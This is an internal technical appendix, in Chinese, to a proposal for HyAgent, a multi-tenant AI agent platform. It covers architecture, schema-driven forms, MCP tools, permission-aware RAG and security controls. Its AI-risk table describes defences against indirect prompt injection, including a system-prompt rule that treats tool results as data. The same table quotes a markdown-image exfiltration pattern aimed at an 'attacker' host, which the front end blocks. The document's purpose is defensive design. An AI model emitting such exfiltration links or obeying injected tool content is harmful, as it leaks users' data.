# HyAgent 導入建議書 — 內部技術附件（限閱）

> **本文件不對外提供。** 內容包含技術堆疊細節、架構內部元件、環境設定項目、
> 檢索與安全機制實作，以及正式上線前的現況缺口清單。
> 對外建議書見 [`HyAgent導入建議書.md`](HyAgent導入建議書.md)；
> 本附件供內部售前、技術評估與客戶技術會議（簽署保密協議後）選擇性引用。

| 項目 | 內容 |
|---|---|
| 文件名稱 | HyAgent 導入建議書 — 內部技術附件 |
| 文件版本 | 1.1 |
| 文件日期 | 2026-10-14 |
| 對應產品版本 | HyAgent v1.2.0 |
| 機密等級 | 內部限閱 |

---

## 1. 摘要

HyAgent 是一個**可嵌入既有網站、也可獨立使用的多租戶 AI Agent 整合平台**。它讓企業使用者用一句話完成原本需要跨系統、跨表單、翻規章才能完成的工作，並讓管理者以**設定而非改程式**的方式擴充新表單、新整合、新知識範圍。

本建議書提出的導入主張有三點：

1. **以對話取代表單填寫成本** — AI 逐步補齊欄位、跨欄驗證、摘要確認後才送出，降低填錯與退件。
2. **以 Schema 與 Integration 定義取代客製開發** — 新增一張表單、換一個目標系統，不動 Agent 核心、不動前端頁面。
3. **以後端強制的權限邊界承載 AI 風險** — 租戶隔離、Scope 權限、知識庫 ACL、送出守門與稽核全部在伺服器端執行，不依賴提示詞約束模型。

平台**不取代**企業既有 OA / HR / ERP / CRM / ITSM，而是位於其上的**體驗層與編排整合層**。

---

## 2. 產品簡介

### 2.1 產品定位

**HyAgent — Universal AI Agent Integration Platform（通用 AI Agent 整合平台）**

使用者端可用自然語言執行跨系統任務、填寫客製化表單、查詢企業知識、產生報告；管理端則以後台管理租戶、權限、Agent 能力、表單、外部系統整合、知識庫、外觀、Webhook、用量與稽核紀錄。平台**不綁定特定產品、系統或業務領域**。

### 2.2 核心設計理念

| 理念 | 說明 | 對客戶的意義 |
|---|---|---|
| Schema 為單一事實來源 | 一份表單 Definition 同時驅動資料契約、UI 元件、驗證規則、Agent 問答話術、版面與外部系統映射 | 前後端不會各寫一套規則而失同步；改規則只改一處 |
| Integration Definition 驅動整合 | 目標連接器、操作、憑證參照、欄位映射、回應解析、錯誤映射與冪等策略皆為設定 | 換一個目標系統不需重寫程式 |
| 多租戶為第一層安全邊界 | 所有業務資料均帶 `tenantId`，跨租戶一律不可讀取或操作 | 可同時服務多企業、多部門、多品牌 |
| 權限在後端強制 | 前端隱藏按鈕不構成安全控制，每次 API 與工具執行皆重查身分與權限 | AI 越權風險由架構承接，非由提示詞承諾 |
| 各層可抽換 | LLM、Embedding、連接器、儲存層皆為抽象介面 | 不被單一 AI 廠商或單一資料庫綁定 |

### 2.3 功能模組總覽

| 模組 | 能力摘要 |
|---|---|
| 對話與意圖分流 | 建立對話、多輪欄位補齊、在表單／知識問答／報告／助理等 Agent 間分流，分流結果受租戶服務與使用者 Scope 約束 |
| Schema-driven 表單 | 六層 Definition（Data / Field / Validation / Agent / Layout / Workflow / Policy / Integration），支援文字、數字、多行、下拉、單選、多選、日期、時間、勾選、附件等元件，前端動態渲染 |
| 表單視覺化 Designer | 後台建立／編輯／匯出租戶表單，不需工程介入 |
| 企業知識問答（RAG） | 網站來源擷取、檔案上傳、資料夾批次匯入、切塊索引、向量＋關鍵詞雙路檢索與重排；查無資料誠實告知 |
| 知識庫權限（ACL） | 可見性標籤標註檔案／網站，再授權給部門、帳號或能力套餐；檢索、回答與報告一律套用使用者有效 Scope |
| 報告產生 | 對話觸發、非同步分節產生，章節內容必以知識庫命中為依據，精確圖表數值由結構化資料計算，支援 Markdown / HTML / PDF |
| 外部系統整合 | 統一 Connector 介面（Stub / 通用 HTTP REST / Webhook / 自訂 Adapter），回應正規化為一致的外部單號與狀態 |
| 回覆品質回饋 | 使用者對每則回覆按讚／倒讚並附原因；伺服器保存問答快照與 ReplyTrace（檢索、工具、模型），後台可篩選、重現檢索、標記處理並看統計 |
| 嵌入與 SDK | Widget Script 嵌入、Headless REST Client、Widget 控制與事件橋接 |
| SSO 帳號連結 | 宿主站台以自家私鑰簽發短效 Identity Assertion，交換為 HyAgent Session |
| Webhook | 表單送出成功後以 HMAC 簽章投遞 `form.submitted`，支援指數退避重試 |
| 管理後台 | 租戶、設定、外觀、權限、使用者目錄、表單、外部系統整合、知識庫、Webhook、用量、報告、稽核、Skills 共十餘個功能頁 |

### 2.4 使用者角色

| 角色 | 主要能力 |
|---|---|
| 一般使用者 | 建立對話、辦理被授權表單、查詢被授權知識、查看自己的對話與報告 |
| 特定群組／帳號 | 依租戶權限政策取得額外服務或特定知識範圍 |
| 租戶管理者 | 設定表單、知識庫、權限、外觀、Webhook、API Key、SSO 與報告 |
| 平台管理者 | 建立／刪除租戶、檢視全平台設定、使用管理 API |
| 外部系統 | SSO 交換、表單資料接收、API 呼叫與事件交換 |

---

## 3. 開發技術與規格

### 3.1 技術堆疊

| 層次 | 技術 |
|---|---|
| 執行環境 | Node.js 20+、TypeScript 5 全端型別共用 |
| 後端 | Express 4、Zod + Ajv（JSON Schema 驗證）、Prisma 5、Pino 結構化日誌、Socket.IO、Helmet、express-rate-limit（可接 Redis）、BullMQ（佇列預備） |
| 前端 | React 18、Vite 5、Tailwind CSS 4、i18next（繁中為主，可多語）、Highcharts（後台圖表） |
| 資料庫 | PostgreSQL（含 pgvector，向量以 `halfvec(3072)` 儲存）；開發／Demo 可用 File 模式 |
| AI 模型 | Anthropic Claude、OpenAI，或地端 OpenAI 相容端點（vLLM / Ollama）；Embedding 同樣支援雲端與地端 |
| 檔案解析 | PDF、Word（docx / doc）、Excel、Markdown、HTML 擷取（Cheerio + Turndown） |
| 文件輸出 | markdown-it、docx、ExcelJS、Chromium（PDF 渲染） |
| 物件儲存 | AWS S3 相容介面（大量附件情境） |
| API 文件 | OpenAPI（`/api/openapi.json`）＋ Swagger UI（`/api/docs`） |
| 工程品質 | Monorepo（npm workspaces）＋ Jest / Vitest 測試、ESLint、TypeScript typecheck、Prettier |

### 3.2 系統架構

```text
Management Portal（管理後台）
  AI 設定 │ Skill Library │ 權限／套餐 │ 表單 │ 知識庫 │ 用量 │ Webhook │ 稽核
        ▼
──────────── Runtime Layer（執行層） ────────────
  Conversation Manager（對話與 Session）
  Authentication（JWT / Identity Assertion SSO）
  Context Builder（User / Role / History / Tenant）
  Intent Router（模型分類器）
  Skill Router（套餐過濾 → 權限解析 → 意圖比對 → 兜底）
        ▼
──────────── Skill Layer（能力層） ────────────
  Form Skill（schema-driven 表單）
  Knowledge Skill（RAG 問答）
  Agent Skill（多步驟工具代理）
  Assistant Skill（兜底與護欄，恆啟用）
        ▼
──────────── Execution Layer（執行與整合層） ────────────
  Tool Executor（scope 檢查 + 稽核）
    ├─ API / Webhook Connector
    ├─ Form Engine（Ajv，六層 schema）
    ├─ RAG / Vector DB（file / pgvector 雙後端）
    └─ 外部系統 Connector（OA / HR / ERP / CRM / ITSM …）
```

架構定位為 **BFF + 整合編排層**：前端永不直接連接後端業務系統；HyAgent 擁有 Schema、執行 Agent、維護對話狀態、執行驗證，再透過連接器與外部系統交換資料。

### 3.3 表單規格：六層 Definition

| 層次 | 用途 | 必要性 |
|---|---|---|
| Data | JSON Schema 資料契約 | 必要 |
| Field | UI 元件、標籤、選項、說明、條款連結 | 必要 |
| Validation | 必填與跨欄商業規則 | 必要 |
| Agent | 詢問順序、提示與確認話術 | 必要 |
| Layout | 欄位分組、排序、多步驟畫面 | 選用 |
| Workflow | 送出後簽核關卡 | 選用 |
| Policy | 工時等領域計算政策 | 選用 |
| Integration | 目標連接器、操作、憑證參照、欄位映射、回應解析、錯誤映射、冪等策略 | 需送外部系統時 |

關鍵規格：

- 前端依 Definition **動態渲染**，不為每張表單另寫頁面。
- 手動修改欄位必須送回後端驗證後才更新 Session；**畫面所見即送出所送**。
- 明確同意欄位必須由使用者主動勾選為 `true`，Agent 不得代為同意。
- 附件單檔上限 10 MB；依 Integration Definition 決定傳送 Metadata、檔案內容或外部儲存 URL。
- 送出須同時通過「已呈現摘要」與「本輪明確確認」兩道**伺服器端**條件。
- Definition 不得保存明文密碼、Token 或 API Key，只能引用租戶層加密憑證。
- 同一張表單可在不同租戶綁定不同 Integration，換目標系統不需改 Agent 核心或前端。

內建 OA 情境表單（請假單、國內出差報銷、外出登記）作為**範例模板**，非能力邊界；租戶可自建 CRM 客戶建檔、ITSM 報修、ERP 採購需求或自訂內部 API 操作等表單，不需新增專屬 Agent 類型。

### 3.4 狀態模型

```text
對話：collecting → confirming → submitting → submitted
          │            │              └→ failed
          └────────────┴────────────────→ cancelled

報告：queued → outlining → composing → done
         │          │            ├──→ empty
         └──────────┴────────────└──→ failed
```

### 3.5 整合方式

| 方式 | 規格 |
|---|---|
| Widget | 載入 Script 並傳入 API Key、表單、語系、主題、位置與 SSO Token；提供 `open` / `close` / `toggle` 控制與送單結果事件 |
| SDK | Headless REST Client、Widget 控制與事件橋接 |
| API Key | `pk_` 可置於瀏覽器；`sk_` 僅限伺服器端高權限操作 |
| SSO | 宿主後端以自家私鑰簽發短效 Identity Assertion（RS256 / ES256），HyAgent 僅持有公鑰（每租戶最多 2 把啟用中），交換端點 `/api/auth/sso/exchange` |
| REST API | 使用者端（auth / conversations / forms / reports / widget config）、租戶端（LLM 設定）、管理端（租戶、表單、整合、知識庫、報告、稽核、Scope、Skills） |
| Webhook | `form.submitted` 事件，HMAC 簽章，指數退避重試，失敗不影響主要送單回應 |
| Connector | 統一介面支援 Stub、通用 HTTP / REST、Webhook 與自訂 Adapter；回應正規化為 `externalId`、`status`、`message`、`redirectUrl`、`rawReference` |
| 憑證管理 | 租戶集中管理 API Key、Bearer Token、Basic Auth、OAuth 2.0 Client Credentials 或自訂密鑰；表單只保存 Credential Reference |
| BYO LLM Key | 租戶可自帶 Anthropic / OpenAI Provider、Model 與 API Key，需先驗證，回傳時遮罩 |

### 3.5.1 MCP Client 與服務端整合

HyAgent Server 以 MCP Client 透過 Streamable HTTP 取得工具清單並呼叫工具；平台管理員管理服務端點、描述、路由關鍵字、逾時、啟用狀態與工具覆寫。服務可共用或指定 ownerTenantId；使用者須具 service:agent 與 mcp:<serverId> 權限，租戶專屬服務僅對該租戶可見。

每個 HTTP 請求由 HyAgent 簽發效期 60 秒的 ES256 JWT，audience 對應 serverId，攜帶租戶、使用者及權限。部署須設定 MCP_SIGNING_KEY，服務端透過 /.well-known/hyagent-mcp-jwks.json 取得公鑰驗章；mcp-kit 提供驗證與 callerFrom(extra)，服務端仍須依呼叫者執行資料授權與稽核。未設定簽章金鑰時不暴露 MCP 工具；目前僅支援 hyagent-jwt，使用者 OAuth 尚未實作。

工具輸入依 JSON Schema 驗證；無效 schema 或工具名稱不暴露給模型。readOnlyHint=true 且管理員於後台核准唯讀，才判定為唯讀，其他工具預設寫入；管理員可用 requireConfirm 強制確認，或 disabled 停用。工具接入共用執行與稽核機制，寫入須經使用者確認。hyagent/display 中繼資料支援表格呈現，欄位 schema 可描述可編輯確認卡片。

現有服務範例：store-demo 提供 product_lookup、inventory_query、replenishment_create、promotion_list、coupon_check；rooms 提供 rooms_availability、rooms_book。兩者皆為示範資料與記憶體寫入，正式上線須接真實系統與持久化儲存。開發規範與範例見 mcp/store-demo/README.md、mcp/kit/README.md 及 mcp/kit/examples/rooms/server.ts。

MCP 驗收須涵蓋連線及驗章、租戶可見性、服務授權、唯讀查詢、寫入確認與取消、工具停用、逾時或服務故障，以及工具稽核。實際已部署的 MCP server 清單須於導入時另行盤點。

### 3.6 知識庫與檢索規格

| 項目 | 規格 |
|---|---|
| 來源 | 網站擷取、單檔上傳、資料夾批次匯入（批次工作可追蹤檔案級結果，單檔失敗不破壞整批） |
| 索引後端 | `file`（JSON 靜態索引，記憶體餘弦計算）／`db`（pgvector，SQL 向量排序），兩者共用同一套評分與保留條件，換後端不改變召回與排序 |
| 檢索策略 | 向量語意檢索 + 關鍵詞 lexical 分支聯集，再重排，避免「語意遠但精確命中產品代碼」漏召 |
| 權限過濾 | 全租戶強制套用；未標記或空標籤文件不可見，不自動公開既有資料 |
| 一致性 | 刪檔或重建索引後，Chunks、結構化表格、Metadata 與 ACL 保持一致 |
| 管理工具 | 可見性標籤、ACL 報告、模擬指定使用者查詢測試、自動與手動建議問句 |

### 3.7 報告規格

- 僅能由對話意圖觸發，需 `service:report` Scope；同租戶同時僅允許一份報告工作執行。
- 分節獨立檢索與彙整，無資料章節明確標示；全節無命中則以 `empty` 結束且不產生檔案。
- 精確圖表數值由結構化資料計算，不由模型自行產生；綜合觀察僅可引用符合條件的精確資料點。
- 可下載格式由後端 Renderer Registry 決定（Markdown、HTML，偵測到 Chromium 時另有 PDF），前端不寫死清單。
- 預設保存 720 小時；使用者僅能存取自己的報告，管理者後台查詢與下載留稽核紀錄。

### 3.8 非功能規格

| 面向 | 規格 |
|---|---|
| 效能與可用性 | 租戶／使用者層級 Rate Limit；LLM 計費路徑套月配額與用量追蹤；報告採非同步工作前端輪詢；`/healthz` 存活檢查、`/readyz` 反映資料庫等必要依賴 |
| 隔離與一致性 | 所有業務資料帶或可推導 `tenantId`；跨租戶查詢回 404 避免洩漏資源存在性；正式環境使用 PostgreSQL 持久化 |
| 可維護性 | Monorepo + 共用型別；表單與流程優先以 Schema 擴充；LLM / Embedding / Connector / 儲存層皆可抽換；異動須通過 Build、Typecheck、Lint 與測試 |
| 可及性與體驗 | 淺色／深色主題、使用者字級調整、尊重 `prefers-reduced-motion`、全程可理解的繁體中文錯誤訊息、嵌入模式隱藏不必要的第一方導覽元素 |
| 可觀測性 | 結構化日誌（Pino）、Prometheus 指標、用量與稽核查詢介面 |

### 3.9 部署拓撲

```text
hyagent-admin  ─┐
hyagent-client ─┼── HTTPS ──> hyagent-server ──> LLM / PostgreSQL / 外部系統 Connector / MCP server / Webhook
外部宿主站台 ──┘
```

三個服務可獨立部署與擴充。關鍵設定項目包括第一方 CORS 網域、預設租戶允許嵌入來源、JWT 金鑰（Access 與 Refresh 須不同且足夠長）、管理密碼與管理 API Key、資料後端與連線字串、LLM Provider 與模型、預設連接器實作、PDF Renderer 的 Chromium 路徑，以及資料加密金鑰。**所有機密僅存於部署平台的環境設定，不進入程式碼庫。**

支援雲端 PaaS 部署，亦可整套地端化：`LLM_PROVIDER=local` 搭配自架 OpenAI 相容端點，Embedding 同步地端化，**選地端時絕不回退雲端**，資料不出機房。

### 3.10 回覆品質回饋機制

每則 AI 回覆產生時，伺服器在 Session 記一筆 `ReplyRecord`（問題、回答、服務、時間）與 `ReplyTrace`（作答模型；知識問答的檢索問句、候選數、是否用到資料表與交給模型的片段 rank / 標題 / 來源 / 分數 / 摘錄；Agent 依序呼叫的工具名稱與成敗，不記輸入）。Trace 只在伺服器與後台使用，不回傳前台。

| 項目 | 規格 |
|---|---|
| 使用者端 API | `PUT /api/conversations/:id/replies/:replyId/feedback`（rating = up / down；倒讚可帶 reason 與 500 字內 comment）、`DELETE` 同路徑取消。只收 replyId，問答由伺服器從 ReplyRecord 取出做快照，前台無法偽造內容；對話歸屬沿用跨租戶 404、他人 403。不呼叫 LLM，不套月配額 |
| 原因代碼 | `wrong` 答錯了、`not_answered` 沒回答到問題、`outdated` 資料過時、`inappropriate` 內容不恰當、`other` 其他 |
| 儲存 | 每筆一列（`reply_feedback`，migration `0020`），data 為 ReplyFeedback 整包；快照與 Session 分開保存，對話被清除後評價仍在。同一使用者對同一回覆改評即覆寫 |
| 後台 API | `GET /api/admin/tenants/:id/feedback`（依 rating / status / serviceId / reason 篩選，游標分頁每頁 10 筆）、`GET …/feedback/stats?days=`（7／30／90）、`PATCH …/feedback/:feedbackId`（open / resolved 與 200 字內處理說明） |
| 後台介面 | 租戶頁「回饋」分頁：統計（評價數、讚的比例、待處理倒讚、各服務評價、倒讚原因分布）、可篩選清單、詳情（問答、檢索紀錄、工具、模型、初步判斷），以及「用這題測試檢索」以提問者身分重跑檢索 |
| 初步判斷 | 依序套用：知識問答零片段且未用資料表 →「沒檢索到資料：知識庫可能缺這份內容，或提問者沒有權限看到」；原因為資料過時 →「請更新下列來源」；答錯但有片段 →「請確認片段內容是否正確，或是模型理解錯誤」 |
| 保存期限 | `FEEDBACK_RETENTION_DAYS`（預設 180、上限 3650），以使用者最後一次評價時間為準；標記處理不延長保存期限 |

---

## 4. 資安規劃

### 4.1 設計原則

1. **提示詞不是安全邊界。** 權限一律由後端與工具執行層強制檢查，模型無法繞過。
2. **前端隱藏不是控制。** 每次 API 呼叫與工具執行都重查身分、租戶與權限。
3. **最小揭露。** 跨租戶存取回 404 而非 403，不洩漏資源是否存在。
4. **預設不公開。** 知識文件未標記即不可見，不自動將既有資料公開。
5. **副作用需明確確認。** 表單送出、寄信等具外部效果的操作必須取得使用者明確確認。

### 4.2 身分與存取控制

| 路徑 | 機制 |
|---|---|
| 嵌入式 SSO（正式建議路徑） | 宿主以**自家私鑰**簽發 Identity Assertion（RS256 / ES256），HyAgent 僅持有公鑰；`kid` 由公鑰推算，`iss` 為 Tenant ID、`aud` 為 `hyagent`，`exp - iat` 上限 300 秒（建議 60 秒），帶一次性 `jti` 防重放；可依 `kid` 或 `sub` 批次作廢既有 Session。**整合方私鑰永不離開其自家後端。** |
| 帳密登入 | 由 `AUTH_PASSWORD_LOGIN` 控制，預設在 production 關閉；關閉時同時拒絕先前以帳密簽發的 Access / Refresh Token。強制開啟於 production 另有兩道門檻：開發預設密碼不得沿用（啟動即失敗），可登入帳號以租戶後台使用者目錄為準。 |
| 外部角色不提權 | SSO 帶入的外部 role 不作為授權來源，一律換發一般員工身分。 |
| Token 生命週期 | Access / Refresh / 管理者使用不同 audience 並明確驗證 issuer；Refresh Token 單次使用，重用即撤銷整個登入 family；租戶刪除、停用 SSO 或金鑰變更後舊 Token 失效。 |
| 管理後台 | 獨立管理密碼登入，`ADMIN_PASSWORD` 未設定即停用登入；機器對機器另用 `x-admin-key`，兩者用途分離且不得暴露於瀏覽器。 |

### 4.3 多租戶隔離

- 租戶是第一層資料安全邊界，跨租戶資源一律不可讀取或操作。
- `requireAuth` 統一檢查 Token 所屬租戶、登入來源、現行憑證與撤銷紀錄；歷史對話、報告、表單與任務路由皆受保護。
- 使用者目錄以**當前租戶**解析姓名、部門、地區、通知信箱、代理人與部門授權；相同 userId 在不同租戶不共用資料。
- 公開訪客使用獨立的權限解析路徑，不會取得與 tenantId 同名帳號的授權。

### 4.4 權限與資料範圍

- 服務權限與資料範圍**分開判斷**：具備知識庫服務權限不代表能讀取所有文件。
- 有效 Scope 為多來源聯集（基礎 ∪ 租戶 ∪ 部門 ∪ 帳號 ∪ 能力套餐），支援群組與個別帳號配置。
- 知識檔案以可見性標籤搭配 Scope 授權；向量檢索、靜態索引、表格目錄與表格內容**全部路徑**套用過濾。
- 自動建議問句僅採用訪客可見語料；權限變更後舊快取隱藏並需重新生成，widget 設定回應為 `Cache-Control: no-store`。
- 表單建立、讀取、編輯、附件、取消、送出與 Agent 工具皆重查 `service:form` 與 `form:<id>`。
- 管理者可模擬指定使用者執行查詢測試，並可產出 ACL 報告檢視配置狀態。

### 4.5 機密資料保護

| 對象 | 保護方式 |
|---|---|
| API Key | 僅存 SHA-256 雜湊，原始值只在簽發時顯示一次；固定預設密鑰已撤銷且啟動時持續拒絕 |
| 租戶 BYO LLM Key | 以 `DATA_ENCRYPTION_KEY`（AES-256-GCM）加密落地，回傳一律遮罩 |
| Session 使用者識別碼 | 同樣加密落地；production 未設定加密金鑰時拒絕建立 Session |
| 外部系統憑證 | 租戶集中管理，表單僅保存 Credential Reference；敏感值僅可新增或輪替，**不可明文讀回** |
| 機密設定 | 密碼、JWT Secret、管理金鑰與 LLM API Key 不得寫入前端 Bundle 或日誌 |
| 租戶讀取回應 | 不含任何密鑰與 LLM 設定；LLM 設定走專用遮罩端點 |
| 對話與評價紀錄 | DB 模式下已完成的 Session 30 天、閒置 Session 90 天自動清除（連同孤兒附件）；回覆評價依 `FEEDBACK_RETENTION_DAYS` 清除 |

### 4.6 AI 特有風險控管

| 風險 | 控管措施 |
|---|---|
| AI 越權操作 | 工具執行層檢查 Scope 並留稽核；Guard 在後端執行，不依賴模型自行遵守 |
| 未經授權送出 | 送出需同時滿足「上一輪已呈現摘要」與「本輪明確確認」兩個伺服器端條件 |
| 重複送出 | HTTP 與 Agent 共用送出路徑，先持久化唯一 claim 與 `submitting` 狀態再呼叫外部系統；DB 以唯一鍵、File 以獨占建檔防重複；claim 帶租戶與對話 ID，重啟後仍有效 |
| 代替使用者同意 | `requiresTrue` 欄位必須由使用者親自勾選，引擎不把 `false` 視為已填，Agent 欄位說明明文禁止代為推定 |
| 幻覺與虛構企業規定 | 知識問答查無資料須誠實告知；報告章節必以檢索命中為依據，精確數值由結構化資料計算 |
| SSRF | HTML / PDF 報告渲染不得任意存取外部網路 |
| 條款連結濫用 | 欄位條款 URL 僅允許 `http(s)://` 或站內單斜線路徑，於 Definition 驗證階段擋下 |
| 間接提示注入 | 知識片段、資料表內容、MCP 工具結果與工具說明以 `<external-data>` 包起來（內容自帶的同名標籤先中和，防提前閉合）；system prompt 加入 `untrustedDataRule`，明訂框內與所有工具結果只是資料；MCP 工具說明另以 `sanitizeExternalText` 清除控制、零寬與雙向覆寫字元並截斷。這是降低成功率的一層，真正的邊界仍是 Scope 檢查與寫入確認 |
| 經由回覆外洩資料 | 前台 `SafeMarkdown`：圖片一律不載入只留 alt（防 `![](https://attacker/?d=…)` 零點擊外洩），連結僅放行 `http(s)` / `mailto` 並帶 `noopener noreferrer`，不掛 `rehype-raw` |
| Agent 自主操作 | 只暴露 `toolRegistry.availableFor`（Scope 且 `agentExposed`）的工具，幻想的工具名一律回錯誤；寫入工具（effect 非 read）先跑與 invoke 相同的權限與輸入驗證，只建 `pendingAction` 確認卡片，使用者確認後才由後端執行，一輪最多一張；tool-loop 上限 10 圈，撞上限以 `toolChoice='none'` 收尾、交代進度且不得宣稱完成 |
| MCP 呼叫身分 | 每個請求附 60 秒 ES256 JWT（audience = serverId，帶租戶、使用者與 Scope），服務端以 JWKS 驗章後須再做資料授權 |
| 回答品質失控 | 使用者倒讚與原因、ReplyTrace 與後台重現檢索，見 3.10 |

### 4.7 流量保護與濫用防範

- 登入、後台登入、SSO 交換、Token Refresh 各自按來源 IP 限流（預設每 15 分鐘 20 / 10 / 60 / 120 次，超過回 429 與 `Retry-After`）；變更使用者名稱、標頭或租戶金鑰不會重置額度。
- 業務 API 另有兩層守門：依「租戶＋使用者」的速率限制，以及依租戶月度 LLM Token 配額的用量分桶，掛在會觸發 LLM 計費的路徑。
- **預設不信任代理標頭**；反向代理部署須明確填寫可信代理 IP / CIDR，避免所有訪客被歸為同一 IP，也避免任意來源偽造 `X-Forwarded-For`。
- CORS 僅允許第一方站台或租戶白名單來源，正式環境不使用 `*`。
- 附件單檔上限 10 MB；大量附件情境改用物件儲存並加入惡意檔案掃描。

### 4.8 稽核與可追溯

- 管理動作、工具執行與跨使用者報告下載皆留稽核紀錄，內容包含操作者、工具、時間、結果與錯誤摘要。
- DB 模式保留稽核全史。
- 被評價的回覆保留 ReplyTrace（檢索片段、工具與成敗、模型），可追查單則回覆的作答依據。
- 稽核紀錄可識別表單、Integration 與外部系統單號，供事後對帳與爭議釐清。
- 建議追蹤的安全類指標：401 / 403 / 404 / 413 / 429 / 5xx 與 CORS 相關錯誤率。

---

## 5. 使用情境

### 5.1 情境一：嵌入企業入口網站，對話式辦理表單

**現況痛點** — 員工要辦一件事，得先找到系統、找到正確表單、看懂欄位、猜規則，填錯再被退件。

**HyAgent 流程**

1. 管理者建立租戶、設定允許嵌入來源、外觀與 SSO 公鑰，核發 `pk_` API Key。
2. 入口網站載入 Widget Script；已登入的員工由宿主後端簽發短效 Identity Assertion，交換為 HyAgent Session，**免再輸入一次密碼**。
3. 員工說「我下週三下午要請半天特休」，Agent 從訊息抽出欄位、逐步追問缺漏、套用跨欄商業規則驗證。
4. 欄位齊備後顯示摘要；員工可在表單畫面手動修正（修正仍經後端驗證）。
5. 員工明確確認後才送出，取得標準化外部單號與狀態，並依設定投遞 HMAC 簽章 Webhook 給宿主系統。

**效益** — 不必記得表單在哪、欄位怎麼填；規則由系統把關而非事後退件。

### 5.2 情境二：權限感知的企業知識問答

**現況痛點** — 規章散落在共用資料夾、內部網站與各版本 PDF；問人最快，但人不一定有空，答案也不一定一致。另一面的風險是：搜尋工具一旦全開，機密文件就外溢。

**HyAgent 流程**

1. 管理者匯入網站來源與文件（支援資料夾批次匯入），建立可見性標籤並標註檔案，再授權給部門、帳號或能力套餐。
2. 員工以自然語言提問；系統解析其有效 Scope，檢索器**只從該租戶且該使用者可見**的片段搜尋。
3. 系統對候選片段評分重排後生成回答並標示來源；查無適當資料時誠實告知，不自行補造企業規定。
4. 管理者可模擬特定帳號執行查詢測試，並以 ACL 報告檢查配置是否如預期。

**效益** — 問答自助化，同時把「誰能看到什麼」變成可驗證的設定，而非口頭約定。

### 5.3 情境三：知識報告產生

**現況痛點** — 主管要一份彙整，承辦人得跨文件抄、跨表格算，做兩天、下次還要再做一次。

**HyAgent 流程**

1. 員工在對話中提出彙整需求；系統確認其具備 `service:report` 權限，主題不足時先追問。
2. 建立非同步工作，依 `queued → outlining → composing` 推進，前端輪詢顯示進度。
3. 每個章節獨立檢索知識庫並彙整；**精確圖表數值由結構化試算表資料計算**，無資料章節明確標示，全節無命中則不產出檔案。
4. 完成後提供 Markdown / HTML（環境具備 Chromium 時另有 PDF）下載；使用者只能取用自己的報告，管理者後台查詢與下載留稽核。

**效益** — 重複性彙整工作從「人天」降到「分鐘」，且數字有結構化來源可回溯，不是模型編出來的。

### 5.4 情境四：跨系統整合（OA / HR / ERP / CRM / ITSM）

**現況痛點** — 每接一個系統就是一次客製案：改前端、改後端、改流程，時程與費用都不可預期。

**HyAgent 流程**

1. 管理者在後台「外部系統整合」建立 Connector：Base URL、憑證、操作、欄位與狀態映射，並執行連線測試。
2. 在表單 Designer 建立或調整表單，於 Integration 層綁定該 Connector 與操作。
3. **不修改 Agent 編排核心、不改前端頁面**，同一套對話能力即可服務新系統；同一張表單可在不同租戶綁定不同目標系統。
4. 各系統回應被正規化為一致的外部單號、狀態、訊息與導向網址，前端與稽核介面無須為每個系統另寫處理邏輯。

**效益** — 第二個、第三個系統的接入成本遠低於第一個；整合工作從「開發」轉為「設定與測試」。

### 5.5 情境五：對外公開站台的 AI 服務窗口

公開 Widget 可置於對外網站，以公開訪客的獨立權限解析運作：只檢索明確授權給訪客的語料，建議問句僅取訪客可見內容，權限變更後舊快取立即隱藏並重新生成。可在不承擔內部資料外洩風險的前提下，把產品與服務資訊自助化。

---

## 6. 預期效益

### 6.1 對使用者

| 效益 | 說明 |
|---|---|
| 降低操作門檻 | 不需知道表單在哪、欄位怎麼填；以自然語言描述需求即可 |
| 降低錯誤與退件 | 格式、必填與跨欄商業規則在送出前由後端驗證 |
| 送出前可見可改 | 摘要確認機制搭配可編輯表單，畫面所見即送出所送 |
| 知識自助查詢 | 規章問答不必等人回覆，且答案受權限約束 |
| 重複彙整自動化 | 報告由系統分節產生，數字可回溯至結構化來源 |
| 無縫進入 | SSO 免二次登入，體驗嵌在既有入口網站內 |

### 6.2 對管理與 IT 單位

| 效益 | 說明 |
|---|---|
| 新增表單不改程式 | 六層 Schema + 視覺化 Designer，業務單位可主導表單調整 |
| 換系統不重做 | Integration Definition 驅動整合，目標系統替換不動 Agent 與前端 |
| 權限可設定、可驗證 | Scope 政策、能力套餐、知識庫 ACL 與模擬查詢測試 |
| 成本可控可歸戶 | 用量按「模型 × 金鑰來源」歸戶、含預估成本；月配額與速率限制雙層守門 |
| 不被單一廠商綁定 | LLM、Embedding、連接器、儲存層皆可抽換，可整套地端化 |
| 可稽核 | 管理動作、工具執行與報告下載留紀錄，可識別表單、整合與外部單號 |
| 多單位共用一套平台 | 多租戶架構支援跨企業、跨部門、跨品牌，各自獨立設定與資料邊界 |

### 6.3 建議追蹤的成效指標

導入後建議以下列指標量化效益（平台已具備計數基礎；**以下為量測項目，非承諾值**）：

| 類別 | 指標 |
|---|---|
| 採用度 | 對話建立數、有效互動使用者數、租戶活躍率 |
| 表單效率 | 開始率、完成率、取消率、失敗率、平均完成輪數 |
| AI 品質 | 首次欄位抽取正確率、人工修正率、回覆讚的比例、倒讚原因分布、待處理倒讚數 |
| 知識品質 | 問答命中率、無結果率、權限過濾後零命中率 |
| 報告 | 完成率、平均產生時間、空報告率、下載率 |
| 整合可靠度 | Webhook 成功率、重試次數、最終失敗率 |
| 成本 | 每租戶／每模型 Token 與成本使用量 |
| 安全與穩定 | 401 / 403 / 404 / 413 / 429 / 5xx 與 CORS 錯誤率 |

---

## 7. 導入建議

### 7.1 建議分階段

| 階段 | 範圍 | 主要產出 |
|---|---|---|
| 第一階段：嵌入與知識 | 建立租戶、設定允許來源與外觀、完成 SSO 對接、匯入知識來源與 ACL 標籤、上線公開或內部 Widget | 可用的 AI 服務窗口與權限感知知識問答 |
| 第二階段：表單與整合 | 以 Designer 建立首批客製表單、建立目標系統 Connector 與欄位映射、完成連線測試與 Webhook | 對話式辦理並成功送單，取得標準化外部單號 |
| 第三階段：報告與治理 | 開放 `service:report`、建立能力套餐與 Scope 政策、導入用量配額與稽核例行檢視 | 報告自助產生、權限與成本治理上線 |

### 7.2 客戶需準備事項

1. **身分來源** — 宿主站台的登入機制，以及簽發 Identity Assertion 的後端能力（私鑰保管於客戶端，HyAgent 僅登記公鑰）。
2. **目標系統介面規格** — 端點、認證方式、請求與回應欄位、錯誤碼，以及附件與簽核狀態的取得方式。
3. **使用者目錄** — 各租戶人員、部門、代理人與通知信箱，供權限與流程解析（上線前應完成匯入，避免依賴共用開發名錄的授權失效）。
4. **知識語料與可見性政策** — 文件來源與「誰可以看到什麼」的分類原則。
